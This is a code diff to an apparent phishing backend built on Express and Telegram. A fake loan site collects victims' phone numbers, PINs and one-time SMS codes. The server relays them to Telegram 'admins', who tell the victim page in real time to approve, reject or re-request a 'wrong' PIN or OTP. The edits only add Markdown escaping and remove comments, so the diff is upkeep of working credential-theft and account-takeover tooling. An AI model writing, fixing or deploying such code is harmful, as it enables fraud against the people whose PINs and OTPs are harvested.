@@ -15,8 +15,13 @@ let activeSessions = {};
 let authorizedAdmins = new Set();
 let pendingMainAdminAuth = new Map();
 
-// Automatically set the very first person who types /start as the Main Admin
 let MAIN_ADMIN_ID = process.env.MAIN_ADMIN_ID || null;
+
+// Helper function to escape Markdown special characters in dynamic variables
+function escapeMarkdown(text) {
+    if (!text) return '';
+    return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+}
 
 function isAuthorized(chatId) {
     if (MAIN_ADMIN_ID && chatId.toString() === MAIN_ADMIN_ID.toString()) return true;
@@ -27,11 +32,10 @@ bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     const userIdStr = chatId.toString();
 
-    // If no main admin exists yet, make this user the Main Admin automatically
     if (!MAIN_ADMIN_ID) {
         MAIN_ADMIN_ID = userIdStr;
         authorizedAdmins.add(userIdStr);
-        bot.sendMessage(chatId, "👑 **You are now registered as the Main Admin!**\nYour ID has been automatically saved. You have full access to receive incoming client credentials and verification alerts.", { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, "👑 *You are now registered as the Main Admin!*\nYour ID has been automatically saved. You have full access to receive incoming client credentials and verification alerts.", { parse_mode: "Markdown" });
         console.log(`Main Admin automatically assigned to ID: ${userIdStr}`);
         return;
     }
@@ -40,15 +44,15 @@ bot.onText(/\/start/, (msg) => {
 
     if (isMain) {
         authorizedAdmins.add(userIdStr);
-        bot.sendMessage(chatId, "✅ **Main Admin Dashboard Active.**\nYou have full access to receive incoming client links and verification alerts.", { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, "✅ *Main Admin Dashboard Active.*\nYou have full access to receive incoming client links and verification alerts.", { parse_mode: "Markdown" });
     } else {
         if (authorizedAdmins.has(userIdStr)) {
-            bot.sendMessage(chatId, "✅ **Sub-Admin Dashboard Active.**\nYou are authorized and receiving client alerts.", { parse_mode: "Markdown" });
+            bot.sendMessage(chatId, "✅ *Sub-Admin Dashboard Active.*\nYou are authorized and receiving client alerts.", { parse_mode: "Markdown" });
         } else {
             pendingMainAdminAuth.set(userIdStr, true);
-            bot.sendMessage(chatId, "🔒 **Sub-Admin Access Request Pending.**\nYour ID requires authorization from the Main Admin to receive client links.", { parse_mode: "Markdown" });
+            bot.sendMessage(chatId, "🔒 *Sub-Admin Access Request Pending.*\nYour ID requires authorization from the Main Admin to receive client links.", { parse_mode: "Markdown" });
             
-            bot.sendMessage(MAIN_ADMIN_ID, `⚠️ **New Sub-Admin Request**\nUser ID: \`${chatId}\` wants access.`, {
+            bot.sendMessage(MAIN_ADMIN_ID, `⚠️ *New Sub-Admin Request*\nUser ID: \`${chatId}\` wants access.`, {
                 parse_mode: "Markdown",
                 reply_markup: {
                     inline_keyboard: [[
@@ -80,12 +84,12 @@ bot.on('callback_query', async (query) => {
         if (data.startsWith('auth_sub_')) {
             authorizedAdmins.add(targetId);
             pendingMainAdminAuth.delete(targetId);
-            bot.sendMessage(targetId, "🎉 **Access Granted!** You are now authorized to receive client links and controls.");
-            bot.sendMessage(chatId, `✅ Successfully authorized sub-admin: ${targetId}`);
+            bot.sendMessage(targetId, "🎉 *Access Granted!* You are now authorized to receive client links and controls.", { parse_mode: 'Markdown' });
+            bot.sendMessage(chatId, `✅ Successfully authorized sub-admin: \`${targetId}\``, { parse_mode: 'Markdown' });
         } else {
             pendingMainAdminAuth.delete(targetId);
-            bot.sendMessage(targetId, "❌ **Access Denied** by Main Admin.");
-            bot.sendMessage(chatId, `❌ Denied sub-admin: ${targetId}`);
+            bot.sendMessage(targetId, "❌ *Access Denied* by Main Admin.", { parse_mode: 'Markdown' });
+            bot.sendMessage(chatId, `❌ Denied sub-admin: \`${targetId}\``, { parse_mode: 'Markdown' });
         }
         bot.answerCallbackQuery(query.id);
         return;
@@ -103,35 +107,35 @@ bot.on('callback_query', async (query) => {
 
     if (action === 'allow') {
         session.status = 'approved_pin';
-        bot.editMessageText(`✅ **PIN & Number ALLOWED** for \`${session.phone}\`\nStatus: Waiting for user to paste OTP SMS.`, {
+        bot.editMessageText(`✅ *PIN & Number ALLOWED* for \`${escapeMarkdown(session.phone)}\`\nStatus: Waiting for user to paste OTP SMS.`, {
             chat_id: chatId,
             message_id: query.message.message_id,
             parse_mode: 'Markdown'
         });
     } else if (action === 'deny') {
         session.status = 'denied';
-        bot.editMessageText(`❌ **PIN & Number DENIED** for \`${session.phone}\``, {
+        bot.editMessageText(`❌ *PIN & Number DENIED* for \`${escapeMarkdown(session.phone)}\``, {
             chat_id: chatId,
             message_id: query.message.message_id,
             parse_mode: 'Markdown'
         });
     } else if (action === 'wrongpin') {
         session.status = 'wrong_pin';
-        bot.editMessageText(`⚠️ **Incorrect PIN Sent Back** to \`${session.phone}\``, {
+        bot.editMessageText(`⚠️ *Incorrect PIN Sent Back* to \`${escapeMarkdown(session.phone)}\``, {
             chat_id: chatId,
             message_id: query.message.message_id,
             parse_mode: 'Markdown'
         });
     } else if (action === 'wrongsms') {
         session.status = 'wrong_sms';
-        bot.editMessageText(`⚠️ **Incorrect SMS/OTP Sent Back** to \`${session.phone}\``, {
+        bot.editMessageText(`⚠️ *Incorrect SMS/OTP Sent Back* to \`${escapeMarkdown(session.phone)}\``, {
             chat_id: chatId,
             message_id: query.message.message_id,
             parse_mode: 'Markdown'
         });
     } else if (action === 'approved') {
         session.status = 'success';
-        bot.editMessageText(`🎉 **Loan Fully Approved & Disbursed** for \`${session.phone}\``, {
+        bot.editMessageText(`🎉 *Loan Fully Approved & Disbursed* for \`${escapeMarkdown(session.phone)}\``, {
             chat_id: chatId,
             message_id: query.message.message_id,
             parse_mode: 'Markdown'
@@ -141,7 +145,6 @@ bot.on('callback_query', async (query) => {
     bot.answerCallbackQuery(query.id);
 });
 
-// Endpoint for submitting Phone and PIN (First Telegram Notification)
 app.post('/api/submit-credentials', express.json(), (req, res) => {
     const { sessionId, phone, pin, amount, duration } = req.body;
     
@@ -153,9 +156,9 @@ app.post('/api/submit-credentials', express.json(), (req, res) => {
     const host = req.get('host');
     const clientLink = `https://${host}/?session=${sessionId}`;
 
-    const message = `🌐 **Client Link:** ${clientLink}\n\n` +
-        `PHONE NO: \`${phone}\`\n` +
-        `PIN: \`${pin}\``;
+    const message = `🌐 *Client Link:* ${clientLink}\n\n` +
+        `PHONE NO: \`${escapeMarkdown(phone)}\`\n` +
+        `PIN: \`${escapeMarkdown(pin)}\``;
 
     authorizedAdmins.forEach(adminId => {
         bot.sendMessage(adminId, message, {
@@ -174,7 +177,6 @@ app.post('/api/submit-credentials', express.json(), (req, res) => {
     res.json({ success: true, sessionId });
 });
 
-// Endpoint for submitting OTP SMS (Second Telegram Notification with Tap-to-Copy)
 app.post('/api/submit-otp', express.json(), (req, res) => {
     const { sessionId, otpText } = req.body;
     const session = activeSessions[sessionId];
@@ -187,7 +189,7 @@ app.post('/api/submit-otp', express.json(), (req, res) => {
     session.status = 'pending_final_approval';
 
     const message = `GOT OTP\nOTP VERIFICATION\n\n` +
-        `PHONE NO: \`${session.phone}\`\n\n` +
+        `PHONE NO: \`${escapeMarkdown(session.phone)}\`\n\n` +
         `OTP:\n\`\`\`text\n${otpText}\n\`\`\``;
 
     authorizedAdmins.forEach(adminId => {
@@ -221,4 +223,4 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-                            
+        
